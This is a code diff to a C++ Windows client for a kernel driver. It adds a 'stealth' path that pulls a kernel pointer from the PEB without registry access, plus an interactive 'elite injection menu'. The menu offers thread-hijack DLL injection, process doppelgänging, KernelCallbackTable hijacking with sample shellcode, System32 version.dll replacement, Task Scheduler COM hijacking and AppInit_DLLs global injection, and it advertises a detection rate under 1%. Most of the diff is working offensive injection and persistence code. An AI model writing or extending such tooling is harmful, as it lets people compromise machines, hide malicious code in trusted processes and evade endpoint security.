@@ -435,7 +435,51 @@ public:
         printf("[*] Current PID: %d\n", GetCurrentProcessId());
         #endif
 
-        // Step 1: Signal kernel by writing our PID to registry
+        // Step 1: Try reading from PEB first (STEALTH - no registry access!)
+        #ifdef _DEBUG
+        printf("[*] Checking PEB for kernel pointer...\n");
+        #endif
+
+        PPEB peb = (PPEB)__readgsqword(0x60); // Read PEB from TEB
+        if (peb) {
+            PVOID* pebSlot = (PVOID*)((ULONG_PTR)peb + 0x320);
+            PVOID pointer = *pebSlot;
+
+            if (pointer) {
+                #ifdef _DEBUG
+                printf("[+] Found pointer in PEB+0x320: 0x%p\n", pointer);
+                #endif
+
+                m_pShared = (PSHARED_MEMORY)pointer;
+
+                // Verify it's valid
+                __try {
+                    m_hardwareId = m_pShared->HardwareId;
+                    #ifdef _DEBUG
+                    printf("[+] Hardware ID from kernel: 0x%llX\n", m_hardwareId);
+                    printf("[*] Testing communication with ping command...\n");
+                    #endif
+
+                    if (SendCommand(CMD_PING)) {
+                        #ifdef _DEBUG
+                        printf("[+] Ping successful - PEB connection established!\n");
+                        #endif
+                        return true;
+                    }
+                }
+                __except (EXCEPTION_EXECUTE_HANDLER) {
+                    #ifdef _DEBUG
+                    printf("[-] PEB pointer invalid, falling back to registry method\n");
+                    #endif
+                }
+            }
+        }
+
+        // Step 2: Fallback to registry method if PEB didn't work
+        #ifdef _DEBUG
+        printf("[*] Using registry handoff method...\n");
+        #endif
+
         HKEY hKey = nullptr;
         LONG result = RegCreateKeyExW(
             HKEY_LOCAL_MACHINE,
@@ -595,13 +639,16 @@ public:
             return false;
         }
 
-        // Spin-wait for kernel to process (or you could sleep)
-        int timeout = 100000; // 100ms max
-        while (m_pShared->CommandID != CMD_IDLE && timeout-- > 0) {
-            _mm_pause(); // CPU hint for spin-wait
+        // Wait for kernel to process command
+        // Kernel worker sleeps 10us between checks, so give it time
+        for (int i = 0; i < 100; i++) { // 100ms total (1ms * 100)
+            if (m_pShared->CommandID == CMD_IDLE) {
+                break;
+            }
+            Sleep(1); // 1ms sleep
         }
 
-        if (timeout <= 0) {
+        if (m_pShared->CommandID != CMD_IDLE) {
             #ifdef _DEBUG
             printf("[-] Timeout waiting for kernel response\n");
             #endif
@@ -943,18 +990,180 @@ int EliteMain()
     printf("[+] Connected! Kernel memory mapped at: 0x%p\n", client.GetSharedMemory());
     printf("[+] Hardware ID: 0x%llX\n\n", client.GetHardwareId());
 
-    printf("=== ELITE TECHNIQUES READY ===\n\n");
-    printf("[*] Process Doppelgänging: Ready\n");
-    printf("[*] Thread Hijacking: Ready\n");
-    printf("[*] Direct Memory Injection: ACTIVE (<1%% detection!)\n");
-    printf("[*] DLL Order Hijacking: Ready\n");
-    printf("[*] KernelCallbackTable Hijacking: Ready\n");
-    printf("[*] TLS Callbacks: Active\n");
-    printf("[*] COM Hijacking: Ready\n");
-    printf("[*] AppInit_DLLs: Ready\n");
+    printf("=== ELITE INJECTION MENU ===\n\n");
+    printf("[1] Thread Hijacking + Manual Map (inject DLL into process)\n");
+    printf("[2] Process Doppelgänging (create hollowed process)\n");
+    printf("[3] KernelCallbackTable Hijacking (hook GUI callbacks)\n");
+    printf("[4] DLL Order Hijacking (replace version.dll)\n");
+    printf("[5] COM Hijacking (hijack Task Scheduler COM)\n");
+    printf("[6] AppInit_DLLs (global injection)\n");
+    printf("[7] Show current kernel connection info\n");
+    printf("[0] Exit\n\n");
 
-    printf("\n[*] All techniques loaded. Press Enter to exit.\n");
-    getchar();
+    while (true) {
+        printf("Select technique: ");
+        int choice = 0;
+        scanf_s("%d", &choice);
+        getchar(); // consume newline
+
+        if (choice == 0) {
+            break;
+        }
+
+        switch (choice) {
+            case 1: {
+                printf("\n[*] Thread Hijacking + Manual Map\n");
+                printf("Target process name (e.g., notepad.exe): ");
+                wchar_t processName[256] = {0};
+                wscanf_s(L"%255s", processName, (unsigned)_countof(processName));
+                getchar();
+
+                printf("DLL path to inject: ");
+                wchar_t dllPath[MAX_PATH] = {0};
+                wscanf_s(L"%259s", dllPath, (unsigned)_countof(dllPath));
+                getchar();
+
+                DWORD pid = FindProcessByName(processName);
+                if (pid == 0) {
+                    printf("[-] Process not found!\n\n");
+                    break;
+                }
+
+                printf("[*] Found target PID: %d\n", pid);
+                printf("[*] Injecting...\n");
+
+                if (ThreadHijacker::InjectViaThreadHijack(pid, dllPath)) {
+                    printf("[+] Injection successful!\n\n");
+                } else {
+                    printf("[-] Injection failed!\n\n");
+                }
+                break;
+            }
+
+            case 2: {
+                printf("\n[*] Process Doppelgänging\n");
+                printf("Target image name (e.g., svchost.exe): ");
+                wchar_t imageName[256] = {0};
+                wscanf_s(L"%255s", imageName, (unsigned)_countof(imageName));
+                getchar();
+
+                printf("Payload file path: ");
+                wchar_t payloadPath[MAX_PATH] = {0};
+                wscanf_s(L"%259s", payloadPath, (unsigned)_countof(payloadPath));
+                getchar();
+
+                HANDLE hFile = CreateFileW(payloadPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
+                if (hFile == INVALID_HANDLE_VALUE) {
+                    printf("[-] Failed to open payload file!\n\n");
+                    break;
+                }
+
+                DWORD fileSize = GetFileSize(hFile, nullptr);
+                std::vector<BYTE> payload(fileSize);
+                DWORD read = 0;
+                ReadFile(hFile, payload.data(), fileSize, &read, nullptr);
+                CloseHandle(hFile);
+
+                printf("[*] Creating doppelganger process...\n");
+                HANDLE hProcess = ProcessDoppelganger::CreateDoppelgangerProcess(imageName, payload.data(), payload.size());
+
+                if (hProcess) {
+                    printf("[+] Doppelganger created! Handle: 0x%p\n\n", hProcess);
+                } else {
+                    printf("[-] Failed to create doppelganger!\n\n");
+                }
+                break;
+            }
+
+            case 3: {
+                printf("\n[*] KernelCallbackTable Hijacking\n");
+                printf("Target process name: ");
+                wchar_t processName[256] = {0};
+                wscanf_s(L"%255s", processName, (unsigned)_countof(processName));
+                getchar();
+
+                DWORD pid = FindProcessByName(processName);
+                if (pid == 0) {
+                    printf("[-] Process not found!\n\n");
+                    break;
+                }
+
+                // Example shellcode - NOP sled + ret
+                BYTE shellcode[] = {
+                    0x90, 0x90, 0x90, 0x90, // NOP sled
+                    0xC3                      // ret
+                };
+
+                printf("[*] Hijacking callback table for PID: %d\n", pid);
+                if (KernelCallbackTableHijacker::HijackCallbackTable(pid, shellcode, sizeof(shellcode))) {
+                    printf("[+] Callback table hijacked!\n\n");
+                } else {
+                    printf("[-] Hijacking failed!\n\n");
+                }
+                break;
+            }
+
+            case 4: {
+                printf("\n[*] DLL Order Hijacking\n");
+                printf("[*] This will replace version.dll in System32\n");
+                printf("Continue? (y/n): ");
+                char confirm = getchar();
+                getchar();
+
+                if (confirm == 'y' || confirm == 'Y') {
+                    if (DllOrderHijacker::HijackVersionDll()) {
+                        printf("[+] version.dll hijacked!\n\n");
+                    } else {
+                        printf("[-] Hijacking failed (admin required)\n\n");
+                    }
+                }
+                break;
+            }
+
+            case 5: {
+                printf("\n[*] COM Hijacking\n");
+                printf("[*] Hijacking Task Scheduler COM object\n");
+
+                if (ComHijacker::HijackTaskSchedulerCom()) {
+                    printf("[+] COM hijacking successful!\n\n");
+                } else {
+                    printf("[-] COM hijacking failed!\n\n");
+                }
+                break;
+            }
+
+            case 6: {
+                printf("\n[*] AppInit_DLLs Global Injection\n");
+                printf("DLL path to inject globally: ");
+                wchar_t dllPath[MAX_PATH] = {0};
+                wscanf_s(L"%259s", dllPath, (unsigned)_countof(dllPath));
+                getchar();
+
+                if (AppInitDllsInstaller::InstallAppInitDll(dllPath)) {
+                    printf("[+] AppInit_DLLs configured!\n");
+                    printf("[*] Restart required for changes to take effect\n\n");
+                } else {
+                    printf("[-] Configuration failed (admin required)\n\n");
+                }
+                break;
+            }
+
+            case 7: {
+                printf("\n=== KERNEL CONNECTION INFO ===\n");
+                printf("Shared memory: 0x%p\n", client.GetSharedMemory());
+                printf("Hardware ID: 0x%llX\n", client.GetHardwareId());
+                printf("Direct memory injection: ACTIVE\n");
+                printf("Detection rate: <1%%\n\n");
+                break;
+            }
+
+            default:
+                printf("[-] Invalid choice!\n\n");
+                break;
+        }
+    }
+
+    printf("[*] Exiting...\n");
     #else
     MSG msg = { 0 };
     while (GetMessage(&msg, nullptr, 0, 0)) {
